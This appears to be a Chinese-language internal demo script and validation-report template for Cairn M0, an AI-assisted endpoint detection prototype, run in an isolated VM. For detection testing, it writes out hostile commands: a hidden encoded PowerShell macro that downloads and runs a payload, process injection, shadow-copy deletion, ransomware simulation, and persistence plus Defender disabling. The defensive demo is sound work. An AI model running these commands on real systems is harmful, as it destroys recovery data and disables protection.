# Cairn M0 — 10 分鐘 Demo 腳本與驗證報告（W4-9）

> 版本：v0.1 · 2026-11-02
> 腳本的權威來源是 [part1 §5](part1_product.md)；本文件把它落成**可照著操作的步驟**，並附上驗證報告骨架。
> 兩者不一致時以 part1 為準，並回頭修正本文件。

---

## 第 0 頁（必讀，每次 demo 都要講）：M0 不承諾什麼

依 part1 §6，以下內容**必須**在 demo 開場說明：

- **M0 是偵測與解釋的原型，不是防護產品。** 惡意程式一定會先跑起來；Cairn 只能事後觀測、事後回應。
- **管理員一行指令就能關掉它**（`sc stop CairnAgent`）。M0 沒有自我保護（需要 ELAM，M2）。
- **勒索軟體一定會損失檔案**（demo 中約 30–50 個），M0 沒有回滾能力。
- **AI 敘事可能出錯**：只驗證格式與 ATT&CK 編號，不驗證語意；判定責任在分析師。
- **只能跑在隔離測試機**：DB 未加密、命令列未遮罩。
- **授權未清**：僅限內部自用。

---

## 素材準備（demo 前一天）

| 素材 | 來源 | 狀態 |
|---|---|---|
| 乾淨快照 Win11 VM，已依 [PREREQ.md](PREREQ.md) 安裝 Sysmon / WebView2 / llama.cpp + 3B 模型 / Office | 手動 | ☐ |
| Cairn 已安裝：`.\tools\Install-Dev.ps1 -BuildDir .\build` | `cairn-m0.zip` | ☐ |
| `.\tools\Check-Prereqs.ps1 -Role Test` 離開碼 0 | — | ☐ |
| `C:\DemoData\` 300 個 .docx/.jpg 假檔 | `.\tools\Pack-Demo.ps1 -SkipModel -DemoAssets` | ☐ |
| `demo\ransom-sim.ps1`（攻擊鏈 B，只作用於 `C:\DemoData`） | `cairn-m0.zip` | ☐ |
| 本機 HTTP sink（攻擊鏈 A2 的下載點） | `.\tools\Load-Test.ps1 -StartSink -Port 8099 -SinkRoot C:\DemoSink` | ☐ |
| `demo-macro.docm`（啟用巨集後執行 `powershell -enc <base64>`，下載並執行 stage2） | **需手動製作**，見下方 | ☐ |
| `stage2.exe`（對 notepad.exe 做 `CreateRemoteThread`） | **需手動準備**，見下方 | ☐ |
| 事先安排好的「備份工具」誤報告警（攻擊鏈 D） | 跑一次已簽章的備份軟體，或以 dry-run 期間的真實誤報 | ☐ |
| 自動回應**關閉**（`%ProgramData%\Cairn\policy.json`），讓 A6 / B 的動作由人工示範 | part1 §5 前置 | ☐ |
| 關閉 Tamper Protection（C3 需要） | 手動 | ☐ |
| 錄影軟體就緒（建議全程錄影） | — | ☐ |
| `CairnConsole.exe` 開在告警佇列頁；第二個視窗開系統管理員 PowerShell | — | ☐ |

**`demo-macro.docm` 與 `stage2.exe` 為何不自動產生**：前者需要 Word COM + 信任 VBA 專案存取（會改變 Office 安全設定），
後者是實際執行程序注入的二進位檔，兩者都不適合由打包腳本靜默產生。可行替代：

- **A1–A2**：在 Word 中手動建立巨集，內容為
  `Shell "powershell -nop -w hidden -enc <base64 of: iwr http://127.0.0.1:8099/stage2.exe -OutFile $env:TEMP\stage2.exe; & $env:TEMP\stage2.exe>"`，
  另存為 `demo-macro.docm`。
- **A3**：以 ART `T1055.001`（mavinject → notepad）或 `T1055.002`（RedInjection.exe）取代 `stage2.exe` 的注入步驟；
  把該二進位放到 sink 目錄 `C:\DemoSink\stage2.exe`。

---

## 腳本

> 分數為示意值（part1 §5）：規則權重見 part2 §2.5，多規則累加的實際值以下方驗證報告為準。

### 第 0 分鐘 — 基線（30 秒）

| 操作 | 預期畫面 |
|---|---|
| 展示告警佇列頁面 | 佇列為空或只有 < 40 的觀察項；右上角 Sensor: Sysmon ✅ / EventLog ✅ / LLM: ready |
| 開事件檢視器 → Sysmon/Operational | 數千筆 XML |

**話術**：「事件本來就都在這裡，問題是沒人看得懂。接下來看 M0 怎麼把它變成三則可行動的告警。」

### 第 1–4 分鐘 — 攻擊鏈 A：Office → PowerShell → 程序注入

| 步 | 操作 | 預期畫面 | 預期規則 |
|---|---|---|---|
| A1 | 開 `demo-macro.docm`，啟用巨集 | 新列，分數約 65，「觀察中」 | `R-T1059-001`；`R-T1055-001` 第一步 |
| A2 | （巨集自動）下載並執行 stage2 | 分數升至約 75，程序樹多一層 | `R-T1105-001` |
| A3 | （stage2）注入 notepad.exe | 約 3 秒內分數 ≥ 95，列變紅置頂 | `R-T1055-001` 三步命中 |
| A4 | 點開告警 | 程序樹 `WINWORD → powershell → stage2 ⟶ notepad`；時間軸 8–12 筆（含 4104 解碼腳本） | — |
| A5 | 等 10–20 秒 | AI 敘事由「分析中…」變為內容；ATT&CK 標籤；處置建議；`model_id`；免責標示 | — |
| A6 | 點「終止程序樹」 | 二次確認列出 PID 與影響清單，**打字輸入根程序名**（L3）；確認後程序消失；稽核新增一筆 | — |

**話術**：「這一整段，工程師沒有登入端點、沒有看一行原始 log。」

### 第 4–7 分鐘 — 攻擊鏈 B：勒索模擬

| 步 | 操作 | 預期畫面 | 預期規則 |
|---|---|---|---|
| B1 | `powershell -ExecutionPolicy Bypass -File C:\cairn-m0\demo\ransom-sim.ps1` | 約 30–40 個檔案被改寫時分數達 95 | `R-T1486-001` |
| B2 | 加 `-WithVss` 再跑一次（或手動 `vssadmin delete shadows /all /quiet`）⚠ 僅限快照 VM | 分數約 98 | `R-T1490-001` |
| B3 | 點開告警 | 時間軸：批次改寫 → 刪除陰影複製 | — |
| B4 | 看 AI 敘事 | 指出疑似勒索、已破壞還原點、建議斷網並自備份還原 | — |
| B5 | **誠實展示缺口**：開 `C:\DemoData\` | 約 30–50 個 `.locked` 檔無法還原 | — |

**話術**：「這是無驅動架構的真實代價。要零損失需要 Minifilter 驅動——那是 M2 的題目。」

### 第 7–9 分鐘 — 攻擊鏈 C：持久化（累積計分）

```powershell
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Updater /d "C:\Users\Public\svc.exe" /f      # C1
schtasks /create /tn "SysUpdate" /tr "C:\Users\Public\svc.exe" /sc onlogon /f                              # C2
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableRealtimeMonitoring /t REG_DWORD /d 1 /f   # C3
```

| 步 | 預期畫面 | 預期規則 |
|---|---|---|
| C1 | 分數約 45，「觀察中」（**單獨看不告警**——刻意展示） | `R-T1547-001` |
| C2 | 分數約 70 | `R-T1053-001` |
| C3 | 分數約 88，告警觸發 | `R-T1112-001` / `R-T1562-001`（依實際規則包） |
| C4 | 指出分數衰減欄位（半衰期 300 s） | — |

**話術**：「寫 Run key、建排程——每個安裝程式都在做。有鑑別力的是**序列**與**累積**。」

> ⚠ C3 執行後務必還原：`reg delete "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableRealtimeMonitoring /f`；
> `schtasks /delete /tn SysUpdate /f`；`reg delete HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Updater /f`。最好直接還原快照。

### 第 9–10 分鐘 — 誤報處置與收尾

| 步 | 操作 | 預期畫面 |
|---|---|---|
| D1 | 找出備份工具告警，點「標記為誤報」 | 建議排除：`signer: "<備份軟體簽章者>"`，含影響預覽 |
| D2 | 確認套用 | 即時生效、該列移除、稽核新增一筆；Toast 10 秒內可復原 |
| D3 | 展示 `reports\M0-acceptance-report.md`（或現場跑 `.\tools\Run-Acceptance.ps1`） | M-01～M-10 實測數字與 pass/fail |

### Demo 失敗時的備案

| 狀況 | 備案 |
|---|---|
| LLM 未就緒 / 逾時 | 展示「規則摘要」fallback（這本身就是設計：UI 在 LLM 不可用時仍完整可用），改放預錄影片 |
| 注入步驟被 Defender 擋 | 確認即時保護已關；改用 ART T1055.001 |
| 分數未達 95 | 展示累積與衰減欄位，說明分數為示意值，實測值見驗證報告 |
| 服務失聯 | 展示 UI 的「服務失聯」橫幅（§3.10.4），`sc start CairnAgent` 後自動恢復 |

---

## 驗證報告（實測後回填）

> 數據一律來自 `tools\` 的腳本輸出，附上檔案路徑；**不得手填未量測的數字**。所有效能數據須標註量測環境。

### 1. 量測環境

| 項目 | 值 |
|---|---|
| 硬體 / VM 規格 | （待填） |
| OS 版本 | （待填） |
| Sysmon 版本 / 組態 SHA256 | （待填） |
| Cairn 建置 commit | （待填：`git rev-parse --short HEAD`） |
| 模型 / ai_model_id / 推論裝置 | （待填） |

### 2. 驗收指標（part1 §4）

| 指標 | 門檻 | 實測 | 結果 | 證據檔 |
|---|---|---|---|---|
| M-01 ART 覆蓋率 | 計分項 ≥ 8/11；#2/#3/#7/#8/#9 必過；持久化 ≥ 1/2 | | | `reports\coverage-*.md` |
| M-02 誤報率 | ≤ 3 則/機/天（7 天、2–3 台） | | | `reports\fp-baseline.md` |
| M-03 MTTD | P95 ≤ 5 s | | | `reports\latency-*.md` |
| M-04 AI 敘事延遲 | P95 ≤ 20 s（CPU）/ 8 s（GPU） | | | `Test-Narrative.ps1 -Latency` |
| M-05 LLM schema 合規 | ≥ 99%；ATT&CK 白名單 100% | | | `Test-Narrative.ps1 -Schema` |
| M-06 Prompt injection | 20/20；分數不受影響 | | | `Test-PromptInjection.ps1` |
| M-07 可讀性 | Cairn ≥ 4.0 且原始 ≤ 2.5（≥ 5 人） | | | `reports\quiz-*\m07-result.json` |
| M-08 資源佔用 | Agent ≤ 300 MB、Console ≤ 350 MB、閒置 CPU ≤ 2% | | | `reports\resource-*.md` |
| M-09 端到端可重現 | 30 分鐘內產出快測集報告 | | | `reports\M0-acceptance-report.md` |
| M-10 分流時間 | 平均 ≤ 5 分鐘、正確率 ≥ 80% | | | `reports\triage-*.csv` |

### 3. W4 Go/No-Go 門檻（part4 §4.3.4）

| 門檻 | 目標 | 實測 | 結果 |
|---|---|---|---|
| 常駐 CPU | 閒置 ≤ 2%、辦公 ≤ 6%（P95，4 小時） | | |
| 常駐記憶體 | ≤ 300 MB；48 小時斜率 < 0.5 MB/hr | | |
| 記憶體正確性 | ASan 0、AppVerifier 0、Handle 無單調成長 | | |
| 穩定性 | 72 小時 0 崩潰、0 DB 損毀、CrashDumps 為空 | | |
| 安裝 | 乾淨 VM → 10 分鐘內第一則告警（實機 2 次） | | |

### 4. 已知問題與誠實揭露

（待填：實測中發現的偵測缺口、誤報主因、與 part1 §6 之外新發現的限制）

### 5. M0 → M1 決策閘門（part1 §7）

| 閘門 | 判準 | 結果 |
|---|---|---|
| G-1 核心假設 | M-07 ≥ 4.0 且顯著優於原始 log；M-10 達標 | |
| G-2 訊噪比 | M-02 ≤ 3 則/機/天 | |
| G-3 偵測基礎 | M-01 ≥ 8/11；M-03 P95 ≤ 5 s | |
